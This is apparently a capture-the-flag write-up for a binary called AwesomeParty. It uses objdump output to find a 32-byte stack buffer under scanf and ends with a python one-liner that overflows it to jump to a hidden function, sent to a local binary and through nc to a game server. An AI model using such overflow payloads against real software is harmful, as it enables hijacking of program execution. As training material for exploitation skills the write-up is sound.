# Party Invitation

## Question Text

There's an awesome that's going to go down next week. 

Created by Noans

## Distribution
AwesomeParty `SHA1: 08797f1fd4473e8d09d64efda3ca429ea0d9afc0`

## Solution
1. Do an objdump on `AwesomeParty` with the command `objdump -d AwesomeParty`.
2. The following parts of from the `objdump` should be studied:  
`0000000000400586 <check>:`  
`400586:	55                   	push   %rbp`  
`400587:	48 89 e5             	mov    %rsp,%rbp`  
`40058a:	48 83 ec 20          	sub    $0x20,%rsp`  
`40058e:	48 8d 45 e0          	lea    -0x20(%rbp),%rax`  
`400592:	48 89 c6             	mov    %rax,%rsi`  
`400595:	bf 78 06 40 00       	mov    $0x400678,%edi`  
`40059a:	b8 00 00 00 00       	mov    $0x0,%eax`  
`40059f:	e8 cc fe ff ff       	callq  400470 <__isoc99_scanf@plt>`  
`4005a4:	bf 7b 06 40 00       	mov    $0x40067b,%edi`  
`4005a9:	e8 a2 fe ff ff       	callq  400450 <puts@plt>`  
`4005ae:	90                   	nop`  
`4005af:	c9                   	leaveq`  
`4005b0:	c3                   	retq`  
Where the third line tells us 32 bytes is reserved for a variable.
3. Derive that one needs to override 32 bytes + rbp to overwrite return address.
4. Also derive address of `awesome` function is `4005b1`.

Final command to exploit local program assuming machine uses little-endian:  
`python -c 'print "a" * 40 + "\xb1\x05\x40"' | ./AwesomeParty`

In order to get the flag, players have to pipe the output to the game server:  
`python -c 'print "a" * 40 + "\xb1\x05\x40"' | nc play.spgame.site 50000`

## Recommended Reads
* https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
* https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64